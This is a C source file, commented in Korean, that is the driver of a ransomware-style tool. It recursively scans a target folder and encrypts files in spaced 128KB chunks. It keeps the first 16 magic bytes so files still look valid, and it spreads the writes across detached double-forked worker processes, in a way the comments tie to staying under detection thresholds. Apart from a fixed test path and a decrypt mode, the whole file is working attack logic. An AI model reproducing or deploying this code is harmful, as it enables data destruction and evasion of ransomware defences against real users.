#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>    // strcasecmp
#include <unistd.h>     // fork, waitpid
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/time.h>   // 시간 측정
#include <dirent.h>
#include <limits.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/mman.h>   // 공유 메모리

#include "crypto.h"     
#include "file_ops.h"   
#include "utils.h"      

// [설정] 128KB 청크 (탐지 마지노선)
#define CHUNK_SIZE (1024 * 128)

// [설정] 33% 암호화 비율 유지 (128KB 쓰고 256KB 건너뜀)
#define STRIDE_SKIP (CHUNK_SIZE * 2)

// [설정] 시그니처(Magic Bytes) 보존 크기 (16바이트 적용)
#define MAGIC_BYTES_SKIP 16

#define MAX_WRITES_PER_PID 10
#define MAX_FILES 10000
#define MAX_CONCURRENT_PROCS 1 

// System V 세마포어 ID
static int g_sem_id = -1;
static int *g_success_count = NULL; 

union semun {
    int val;
    struct semid_ds *buf;
    unsigned short *array;
};

// [수정] calculate_safe_start_offset
// 시그니처(16바이트)만 남기고 즉시 헤더 타격
long calculate_safe_start_offset(const char *filename, long filesize) {
    // 파일이 너무 작으면(최소한의 헤더 구조도 없으면) 스킵
    if (filesize < 64) return filesize; 
    
    // 시그니처(Magic Bytes) 16바이트 건너뛰고 17번째 바이트부터 암호화
    // 결과: OS는 파일 형식을 인식하지만, 내부는 완전히 깨짐
    return MAGIC_BYTES_SKIP; 
}

static void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [mode]\n", prog_name);
    fprintf(stderr, "Modes:\n");
    fprintf(stderr, "  -e    Encrypt mode\n");
    fprintf(stderr, "  -d    Decrypt mode\n");
}

void reserve_process_slot() {
    struct sembuf sops;
    sops.sem_num = 0;
    sops.sem_op  = -1; 
    sops.sem_flg = SEM_UNDO; 
    
    if (semop(g_sem_id, &sops, 1) == -1) {
        perror("reserve_process_slot failed");
        exit(1);
    }
}

void release_process_slot() {
    struct sembuf sops;
    sops.sem_num = 0;
    sops.sem_op  = 1; 
    sops.sem_flg = SEM_UNDO; 
    
    if (semop(g_sem_id, &sops, 1) == -1) {
        perror("release_process_slot failed");
    }
}

int init_semaphore(int max_procs) {
    g_sem_id = semget(IPC_PRIVATE, 1, IPC_CREAT | 0666);
    if (g_sem_id == -1) {
        perror("semget failed");
        return -1;
    }
    union semun arg;
    arg.val = max_procs;
    if (semctl(g_sem_id, 0, SETVAL, arg) == -1) {
        perror("semctl failed");
        return -1;
    }
    return 0;
}

void destroy_semaphore() {
    if (g_sem_id != -1) semctl(g_sem_id, 0, IPC_RMID);
}

static int spawn_worker(const char *target, long offset, int chunks, long stride, int mode) {
    pid_t pid = fork();

    if (pid < 0) {
        perror("First fork failed");
        return 1;
    }

    if (pid == 0) {
        if (setsid() < 0) {}
        
        pid_t grand_pid = fork();
        if (grand_pid < 0) _exit(1);
        
        if (grand_pid == 0) {
            reserve_process_slot(); 
            
            int ret;
            // crypto.c의 함수 호출 (encrypt_chunk_stride 사용 가정)
            if (mode == 0) {
                ret = encrypt_chunk_stride(target, offset, chunks, CHUNK_SIZE, stride);
            } else {
                ret = decrypt_chunk_stride(target, offset, chunks, CHUNK_SIZE, stride);
            }

            if (ret == 0 && g_success_count != NULL) {
                __sync_fetch_and_add(g_success_count, 1); 
            }

            release_process_slot(); 

            if (ret != 0) _exit(1);
            _exit(0);
        }
        _exit(0);
    } else {
        int status;
        waitpid(pid, &status, 0);
        return 0;
    }
}

void execute_attack(int mode) {
    for (int i = 0; i < file_count; i++) {
        char *target = file_queue[i];

        struct stat st;
        if (stat(target, &st) != 0) continue; 
        
        long total_size = st.st_size;
        if (total_size <= 0) continue;

        // PID 하나가 커버하는 바이트 수
        long bytes_per_pid = (long)MAX_WRITES_PER_PID * (CHUNK_SIZE + STRIDE_SKIP);

        // [수정 적용됨] 시그니처만 건너뛴 위치(16)부터 시작
        long current_offset = calculate_safe_start_offset(target, total_size);
        if (current_offset >= total_size) {
            // 너무 작은 파일 스킵
            continue; 
        }

        long remaining = total_size - current_offset;
        int estimated_pids = (remaining + bytes_per_pid - 1) / bytes_per_pid;
        if (estimated_pids < 1) estimated_pids = 1;

        printf("[TARGET] %s (Size: %ld) 시작 - 헤더 타격 (Offset: %ld)\n",
               target, total_size, current_offset);

        int child_round = 0;
        int attack_failed = 0;
        
        if (g_success_count) *g_success_count = 0;
        int expected_successes = 0;

        while (current_offset < total_size) {
            
            // Watchdog Logic
            int wait_retries = 0;
            while (1) {
                int val = semctl(g_sem_id, 0, GETVAL);
                if (val > 0) break; 
                
                usleep(1000); 
                wait_retries++;
                if (wait_retries > 5000) {
                    release_process_slot();
                    wait_retries = 0;
                }
            }

            int ret = spawn_worker(target, current_offset, MAX_WRITES_PER_PID, STRIDE_SKIP, mode);
            child_round++;
            expected_successes++; 
            
            if (ret != 0) {
                attack_failed = 1;
                usleep(500000); 
                break; 
            }
            
            current_offset += bytes_per_pid;
            usleep(200000); 
        }

        // Tail 처리
        if (!attack_failed && current_offset < total_size) {
             while (1) {
                int val = semctl(g_sem_id, 0, GETVAL);
                if (val > 0) break;
                usleep(1000);
            }
            int ret = spawn_worker(target, current_offset, 1, STRIDE_SKIP, mode);
            if (ret == 0) {
                child_round++;
                expected_successes++;
            }
        }

        // 마무리 대기
        int finish_wait = 0;
        while (1) {
            int val = semctl(g_sem_id, 0, GETVAL);
            if (val == -1 || val >= MAX_CONCURRENT_PROCS) break;
            usleep(10000); 
            finish_wait++;
            if (finish_wait > 500) break;
        }

        if (!attack_failed) {
            int successes = (g_success_count) ? *g_success_count : 0;
            if (successes == expected_successes) { // -1 오차 허용
                printf("[COMPLETE] %s 완료\n", target);
            } else {
                printf("[KILLED] %s (시도: %d, 성공: %d)\n", target, expected_successes, successes);
            }
        } else {
            printf("[STOP] %s 처리 중단됨\n", target);
        }
    }
}

int main(int argc, char *argv[]) {
    struct timeval start_time, end_time;
    gettimeofday(&start_time, NULL);

    if (argc != 2) { 
        fprintf(stderr, "Error: Invalid arguments.\n\n");
        print_usage(argv[0]);
        return 1;
    }

    int mode;
    if (strcmp(argv[1], "-e") == 0) mode = 0;
    else if (strcmp(argv[1], "-d") == 0) mode = 1;
    else {
        fprintf(stderr, "Error: Invalid mode '%s'\n\n", argv[1]);
        print_usage(argv[0]);
        return 1;
    }

    const char *home_dir = getenv("HOME");
    if (!home_dir) {
        fprintf(stderr, "Error: HOME environment variable not set.\n");
        return 1;
    }
    
    char start_path[PATH_MAX];
    if (snprintf(start_path, sizeof(start_path),
             "%s/workspace/target", home_dir) >= (int)sizeof(start_path)) {
        fprintf(stderr, "Error: Target path is too long.\n");
        return 1;
    }
    
    printf("--- Start Traversal ---\n");
    printf("  Target Mode: %s\n", (mode == 0) ? "ENCRYPT" : "DECRYPT");
    printf("  Target Path: %s\n", start_path);
    printf("------------------------\n");
    
    scan_directory_recursive(start_path);
    printf(">>> Found %d files\n", file_count);

    g_success_count = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, 
                           MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_success_count == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    if (init_semaphore(MAX_CONCURRENT_PROCS) == -1) {
        return 1;
    }

    execute_attack(mode); 

    printf(">>> Waiting for remaining workers...\n");
    
    int max_retries = 30; 
    while (max_retries > 0) {
        int val = semctl(g_sem_id, 0, GETVAL);
        if (val == -1 || val >= MAX_CONCURRENT_PROCS) break;
        usleep(100000); 
        max_retries--;
    }

    destroy_semaphore();
    munmap(g_success_count, sizeof(int));

    printf("------------------------\n");
    
    gettimeofday(&end_time, NULL);
    double elapsed_sec = (end_time.tv_sec - start_time.tv_sec) + 
                         (end_time.tv_usec - start_time.tv_usec) / 1000000.0;

    printf("\n");
    printf("========================================\n");
    printf(" [TIMING] Total Execution Time: %.4f sec\n", elapsed_sec);
    printf("========================================\n");
    return 0;
}